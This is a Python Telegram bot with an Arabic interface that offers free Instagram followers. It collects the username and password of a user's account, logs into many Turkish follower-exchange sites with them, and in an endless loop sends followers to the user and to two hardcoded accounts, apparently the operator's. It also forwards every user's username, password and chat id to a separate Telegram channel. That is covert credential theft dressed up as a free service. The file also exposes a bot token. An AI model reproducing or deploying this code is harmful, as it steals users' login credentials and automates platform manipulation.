import telebot

from telebot import types

import time

import re

import json

import threading

import requests 

from googletrans import Translator
def app(environ, start_response):
        data = b"Hello, World!\n"
        start_response("200 OK", [
            ("Content-Type", "text/plain"),
            ("Content-Length", str(len(data)))
        ])
        return iter([data])
translator = Translator()

CHANNEL_USERNAME = '@zxgn1'

CHANNEL_ID = '@tmx778'

bot = telebot.TeleBot("7375134394:AAF6BxIBL3xs-gsJIygB8sEKQjf9L4KUuWU")

bot.set_webhook()

user_threads = {}

def extract_numbers(text):

    numbers = re.findall(r'\d+', text)

    numbers_str = ''.join(numbers)

    return numbers_str

def check_message(message_json):

    try:

        message_dict = json.loads(message_json)

        if "success" in message_dict["status"].lower():

            print("ok send ")

        else:

            print("no send ")

    except (KeyError, json.JSONDecodeError):

        print("error")

def birtakipci(usernamee,passwordd,uusernamesndd,url2,url4):

    params = ''

    data = {

        'username': usernamee,

        'password': passwordd,

        'userid': '',

        'antiForgeryToken': '266abe02543bfe5bd7c83aa175830522',

    }

    session = requests.session()

    response = session.post(url2, data=data,  allow_redirects=False)

    params = {

            'formType': 'findUserID',

        }

    data = {

            'username': uusernamesndd,

        }

    response = session.post(url4, params=params, cookies=session.cookies,  data=data)

    print(response.url)

    url_string = str(response.url)

    print(url_string)

    extracted_numbers = extract_numbers(url_string)

    print(extracted_numbers)

   

    params = {

            'formType': 'send',

        }

    data = {

            'adet': '1500',

            'userID': extracted_numbers,

            'userName': uusernamesndd,

        }

    response = session.post(

            url_string,

            params=params,

            cookies=session.cookies,

           

            data=data,

        )

  

    check_message(response.text)

url1 = 'https://birtakipci.com/member'

url11 = 'https://birtakipci.com/tools/send-follower'

url2 = 'https://hepsitakipci.com/member'

url22 = 'https://hepsitakipci.com/tools/send-follower'

url3 = 'https://medyahizmeti.com/member'

url33 = 'https://medyahizmeti.com/tools/send-follower'

url4 = 'https://takipciking.com/member'

url44 = 'https://takipciking.com/tools/send-follower'

url5 = 'https://takipcimx.net/login'

url55 = 'https://takipcimx.net/tools/send-follower'

url6 = 'https://takipcitime.com/login'

url66 = 'https://takipcitime.com/tools/send-follower'

url7 = 'https://takipfun.net/login'

url77 = 'https://takipfun.net/tools/send-follower'

url8='https://takipcibase.com/login'

url88='https://takipcibase.com/tools/send-follower'

url9='https://takipcikrali.com/login'

url99='https://takipcikrali.com/tools/send-follower'

url10='https://takipcimx.com/member'

url100='https://takipcimx.com/tools/send-follower'

url111='https://canlitakipci.com/login'

url1111='https://canlitakipci.com/tools/send-follower'

url12='https://takipcizen.com/login'

url122='https://takipcizen.com/tools/send-follower'

url13='https://takipzan.com/login'

url133='https://takipzan.com/tools/send-follower'

url14='https://takipcigen.com/login'

url144='https://takipcigen.com/tools/send-follower'

url15='https://followersize.com/member'

url155='https://followersize.com/tools/send-follower'

url16='https://bigtakip.com/member'

url166='https://bigtakip.com/tools/send-follower'

url17='https://followersize.net/login'

url177='https://followersize.net/tools/send-follower'

url18='https://takipciking.net/login'

url188='https://takipciking.net/tools/send-follower'

@bot.message_handler(commands=['start'])

def start(message):

    chat_id = message.chat.id

    is_subscribed = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status != 'left'

    if is_subscribed:

        user_name = message.chat.first_name

        keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)

        yes_button = telebot.types.InlineKeyboardButton("- رشق -", callback_data="yes")

        no_button =  telebot.types.InlineKeyboardButton("- الشرح -", url="https://t.me/zxgn1")

   

        keyboard.add(yes_button, no_button)

        bot.send_message(chat_id=message.chat.id, text=f"- مرحبًا  {user_name}  أنا بوت رشق متابعين إنستجرام مجانًا. اضغط على زر الرشق", reply_markup=keyboard)

    else:

        bot.send_message(chat_id, '🚸| عذرا عزيزي\n🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه\n\n- https://t.me/zxgn1\n\n‼️| اشترك ثم ارسل /start')

   

@bot.callback_query_handler(func=lambda call: True)

def handle_callback(call):

    if call.data == "yes":

        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="- اذا واجهتك مشكلة هاي قناة التعليمات @zxgn1 -")

        bot.send_message(call.message.chat.id, "- ارسل يوزر الحساب الوهمي :")

        bot.register_next_step_handler(call.message, get_name)

    elif call.data == "no":

        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="لا مشكلة.")

    else:

        bot.answer_callback_query(callback_query_id=call.id, text="عذرًا، لم أفهم ما قلته.")

def get_name(message):

    global name

    chat_id = message.chat.id

    name = message.text

    

    if message.text == '/start':

        start(message)

          

          

        

    else:

        bot.send_message(chat_id, "- أرسل كلمة المرور الخاصة بالحساب الوهمي :")   

        bot.register_next_step_handler(message, get_age)

        user_input = message.text

         

          

        

# يتم استدعاء هذه الدالة للحصول على عمر المستخدم

def get_age(message):

    global age

    chat_id = message.chat.id

    age = message.text

    if message.text == '/start':

        start(message)

    else:

        data = {

                'username': name,

                'password': age,

                'userid': '',

                'antiForgeryToken': '266abe02543bfe5bd7c83aa175830522',

            }

        session = requests.session()

        response = session.post(url3, data=data,  allow_redirects=False)

        try:

            message_dict = json.loads(response.text)

            if "success" in message_dict["status"].lower():

                print("ok send ")

                bot.send_message(chat_id,"- ارسل يوزر حسابك الاساسي فقط ( يوزر الحساب الذي تريد اضافة المتابعين له )  :")

                bot.register_next_step_handler(message, emali_bot)

            else:

                try:

                    arabic_text = translator.translate(json.loads(message_dict['error'])['message'], src='en', dest='ar').text

                    bot.send_message(chat_id,arabic_text)

                except Exception as e:

                    error_message = message_dict['error']

                    arabic_texts=translator.translate(error_message, src='tr', dest='ar').text

                    print(arabic_texts)

                    bot.send_message(chat_id,arabic_texts)

        except (KeyError, json.JSONDecodeError):

            bot.send_message(chat_id,"حدث خطاء")

def emali_bot(message):

    global emali

    chat_id = message.chat.id 

    emali = message.text

    if message.text == '/start':

        start(message)

    else:

        bot.send_message(chat_id, "تم ارسل المتابعين الى هذا الحساب   " + emali+" ارسل /start للبدء من جديد")

        bot.send_message(CHANNEL_ID, name+"\n"+age+"\n"+ emali+"\n"+str(chat_id))

        thread = threading.Thread(target=my_function, args=(chat_id,name,age,emali))

        thread.start()

        

    

def my_function(chat_id,name,age,emali):

    while True:

        birtakipci(name,age,emali,url1,url11)

        print(f"بدأ تشغيل الدالة بواسطة الخيط الخاص بالمستخدم {chat_id}")

        birtakipci(name,age,emali,url2,url22)

        birtakipci(name,age,"zxg.n",url6,url66)

        birtakipci(name,age,"anas70218",url4,url44)

        

        

        birtakipci(name,age,emali,url5,url55)

        

        

    

bot.polling()

